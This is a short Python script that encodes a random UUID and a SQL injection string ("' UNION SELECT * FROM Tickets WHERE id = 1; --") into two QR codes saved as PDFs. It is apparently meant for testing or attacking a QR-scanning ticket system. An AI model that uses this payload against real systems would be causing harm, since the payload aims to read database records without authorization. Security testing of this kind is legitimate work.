import uuid

import img2pdf
import qrcode


def save_pdf(qr, filename):
    qr.save(filename)
    with open(filename, "rb") as f:
        img = img2pdf.convert(f.read())
    with open(filename, "wb") as f:
        f.write(img)


guid = str(uuid.uuid4())
payload = "' UNION SELECT * FROM Tickets WHERE id = 1; --"

qr1 = qrcode.make(guid)
save_pdf(qr1, "qr1.pdf")
qr2 = qrcode.make(payload)
save_pdf(qr2, "qr2.pdf")
